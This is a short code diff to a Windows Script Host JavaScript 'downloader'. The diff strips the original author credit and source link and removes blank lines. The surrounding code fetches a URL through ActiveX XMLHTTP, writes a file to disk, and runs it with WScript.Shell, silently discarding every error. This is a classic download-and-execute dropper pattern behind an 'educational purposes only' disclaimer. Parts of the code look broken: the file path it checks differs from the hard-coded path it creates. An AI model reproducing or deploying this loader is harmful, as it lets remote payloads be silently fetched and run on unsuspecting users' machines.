@@ -1,5 +1,4 @@
-// Author     : Pig2333
-// Name      : JavaScript Downloader (http[s]://gitee[.]com/xiaozhu2007/JS-Downloader)
+// Name      : JavaScript Downloader 修改版
 // This script is distributed for educational purposes only.此脚本仅供学习使用
 try {
     var WshShell = WScript.CreateObject("WScript.Shell");
@@ -8,7 +7,6 @@ try {
     var xhr = new ActiveXObject("MSXML2.XMLHTTP")
     xhr.open("GET", url, false)
     xhr.send()
-
     var fso = new ActiveXObject("Scripting.FileSystemObject")
     if (fso.FileExists(filepath) == false) {
         var file = fso.Createtextfile("c:\\Fuck\\info.txt", true)
@@ -17,7 +15,6 @@ try {
         // 关闭文件
         file.Close();
     }
-
     var shell = WScript.CreateObject("WScript.Shell")
     shell.Run(filepath)
 } catch (e) {/* eat any errors */ }
